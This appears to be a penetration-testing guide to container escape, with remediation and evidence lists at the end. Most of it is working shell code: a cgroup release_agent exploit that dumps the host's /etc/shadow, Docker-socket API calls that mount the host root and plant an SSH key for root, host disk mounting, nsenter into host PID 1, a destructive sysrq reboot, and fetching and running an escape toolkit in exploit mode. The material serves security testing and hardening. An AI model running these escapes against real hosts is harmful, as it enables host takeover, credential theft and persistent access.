# Container Escape Techniques

## Overview
Container escape testing identifies paths by which an attacker who has gained code execution inside a container can break out of the container's isolation boundaries to access the host operating system. Escape vectors include privileged container mode, mounted Docker sockets, kernel exploits, cgroups abuse, nsenter techniques, and Linux capability misconfigurations. A successful container escape typically grants root access to the underlying host.

## Classification
- **CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-269 (Improper Privilege Management), CWE-648 (Incorrect Use of Privileged APIs)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS Base:** 8.8 - 10.0 (Critical — host compromise)
- **MITRE ATT&CK:** T1611 (Escape to Host), T1068 (Exploitation for Privilege Escalation)

## Detection Methodology

### 1. Environment Reconnaissance (From Inside Container)
```bash
# Confirm you are in a container
cat /proc/1/cgroup 2>/dev/null | grep -qE "(docker|kubepods|containerd)" && echo "Container detected"
ls /.dockerenv 2>/dev/null && echo "Docker container"
cat /proc/1/sched 2>/dev/null | head -1  # PID 1 process name

# Check container runtime
cat /proc/1/cgroup
cat /proc/self/mountinfo | head -20

# Check current capabilities
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null

# Check if running as root
id
whoami

# Check kernel version (for kernel exploit candidates)
uname -r
cat /proc/version

# Check available filesystems and mounts
mount
df -h
cat /proc/self/mountinfo

# Check for sensitive host mounts
mount | grep -E "(docker.sock|/etc|/root|/home|hostfs|/proc/sys)"

# Check for AppArmor/SELinux enforcement
cat /proc/self/attr/current 2>/dev/null
getenforce 2>/dev/null

# Check seccomp status
cat /proc/self/status | grep -i seccomp
# Seccomp: 0 = disabled, 1 = strict, 2 = filter
```

### 2. Privileged Container Escape
```bash
# Check if privileged
cat /proc/self/status | grep -i cap
# CapEff: 0000003fffffffff = all capabilities = privileged

# Method 1: Mount host filesystem
fdisk -l  # List host disks
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Method 2: Access host via /proc/sysrq-trigger
echo b > /proc/sysrq-trigger  # Reboot host (destructive — test only)

# Method 3: Load kernel module
insmod /path/to/module.ko

# Method 4: Write to host cgroup release_agent
# Works when container has CAP_SYS_ADMIN
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escape
echo 1 > $d/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow_output" >> /cmd
chmod a+x /cmd
sh -c "echo 0 > $d/escape/cgroup.procs"
cat /shadow_output
```

### 3. Docker Socket Escape
```bash
# Check for mounted Docker socket
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Method 1: Use Docker CLI if available
docker run -v /:/hostfs --privileged -it alpine chroot /hostfs /bin/sh

# Method 2: Use curl against Docker API
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq

# Create a privileged container with host filesystem
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","chroot /hostfs /bin/sh -c \"id > /tmp/escape_proof\""],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}' \
  http://localhost/containers/create
# Returns container ID

# Start the container
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/<id>/start

# Method 3: Write SSH key to host
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo ssh-rsa AAAA... >> /hostfs/root/.ssh/authorized_keys"],"HostConfig":{"Binds":["/:/hostfs"]}}' \
  http://localhost/containers/create
```

### 4. Kernel Exploit Escape
```bash
# Check kernel version
uname -r

# Notable kernel vulnerabilities for container escape:
# CVE-2022-0847 (DirtyPipe) — Linux 5.8 to 5.16.11
# CVE-2022-0185 — Linux 5.1+ (file system context)
# CVE-2021-22555 (Netfilter) — Linux 2.6.19 to 5.12
# CVE-2020-14386 — Linux 4.6 to 5.9
# CVE-2019-5736 (runc) — runc < 1.0-rc6
# CVE-2016-5195 (DirtyCow) — Linux 2.6.22 to 4.8.3

# DirtyPipe example (CVE-2022-0847)
# Overwrites read-only files, can modify /etc/passwd on host via /proc
# if container shares PID namespace with host

# runc exploit (CVE-2019-5736)
# Overwrites host runc binary via /proc/self/exe
# Requires: exec into container while exploit runs

# Check runc version from within container
cat /proc/self/exe 2>/dev/null  # May reveal runc path
```

### 5. Cgroups Abuse
```bash
# Method: Release agent exploit (requires CAP_SYS_ADMIN)
# Step 1: Find writable cgroup mount
mount | grep cgroup

# Step 2: Create a cgroup and set up release agent
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/escape

# Step 3: Enable notification
echo 1 > /tmp/cgrp/escape/notify_on_release

# Step 4: Get host path of container filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 5: Set release agent to a script on host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 6: Write payload
cat > /cmd <<EOF
#!/bin/sh
id > $host_path/output
hostname >> $host_path/output
cat /etc/shadow >> $host_path/output
EOF
chmod a+x /cmd

# Step 7: Trigger by adding and removing a process
sh -c "echo \$\$ > /tmp/cgrp/escape/cgroup.procs"

# Step 8: Read output
cat /output
```

### 6. nsenter Escape
```bash
# Requires: PID namespace sharing with host OR access to host PID 1

# If hostPID is true, can nsenter into host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Verify you are on the host
hostname
cat /etc/hostname
ls /
```

### 7. Capability-Based Escape
```bash
# Check current capabilities
capsh --print 2>/dev/null
grep Cap /proc/self/status

# Decode capabilities
capsh --decode=<hex-value>

# Dangerous capabilities for escape:
# CAP_SYS_ADMIN — mount filesystems, cgroup manipulation, many kernel operations
# CAP_SYS_PTRACE — ptrace processes in other namespaces
# CAP_SYS_MODULE — load kernel modules
# CAP_DAC_READ_SEARCH — bypass file read permission checks
# CAP_NET_ADMIN — modify network settings, potentially escape network namespace
# CAP_SYS_RAWIO — raw I/O port access

# CAP_SYS_PTRACE escape: inject into host process
# (Requires host PID namespace sharing)
python3 -c "
import ctypes
libc = ctypes.CDLL('libc.so.6')
# Attach to host PID 1 and inject shellcode
"

# CAP_DAC_READ_SEARCH escape: read any file on host
# Use open_by_handle_at() syscall to read host files
# Tool: shocker.c — exploits this capability
```

## Tool Usage

### Deepce
```bash
# Automated container escape enumeration
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
chmod +x deepce.sh
./deepce.sh

# With exploitation attempts
./deepce.sh --exploit
```

### CDK (Container pentest toolkit)
```bash
# Evaluate container security posture
./cdk evaluate

# Auto-escape
./cdk auto-escape

# Specific exploits
./cdk run shim-pwn
./cdk run docker-sock-check
./cdk run mount-disk
```

### amicontained
```bash
# Check container runtime and security posture
amicontained

# Reports:
# - Container runtime
# - Enabled capabilities
# - Seccomp status
# - Namespaces
# - AppArmor profile
```

### PEIRATES (Kubernetes-focused)
```bash
# Post-exploitation toolkit for Kubernetes
./peirates
# Automated service account analysis and escape paths
```

## Remediation
1. **No privileged containers:** Never run containers with `--privileged` flag; grant only specific capabilities needed with `--cap-add`
2. **Drop all capabilities:** Start with `--cap-drop ALL` and selectively add required capabilities
3. **Docker socket:** Never mount the Docker socket into containers; use Docker-in-Docker with rootless mode if container management is needed
4. **Kernel hardening:** Keep the host kernel patched, use gVisor or Kata Containers for stronger isolation, enable seccomp profiles
5. **Namespaces:** Never share host PID, network, or IPC namespaces with containers unless absolutely required
6. **Read-only filesystem:** Use `--read-only` flag and mount only specific writable paths via tmpfs
7. **User namespaces:** Enable user namespace remapping so container root maps to unprivileged host user
8. **Seccomp and AppArmor:** Apply restrictive seccomp profiles and AppArmor/SELinux policies to limit syscalls
9. **Runtime detection:** Deploy Falco or similar runtime security tools to detect escape attempts

## Evidence Collection
- Capability listing showing dangerous capabilities granted
- Privileged container configuration evidence
- Docker socket access proof (host container listing from within)
- Host filesystem access via mounted volumes or disk mounting
- Kernel version and applicable CVE mapping
- Cgroup release agent exploitation output
- nsenter command output showing host access
- Deepce/CDK scan results identifying escape vectors
- Seccomp/AppArmor status showing lack of enforcement
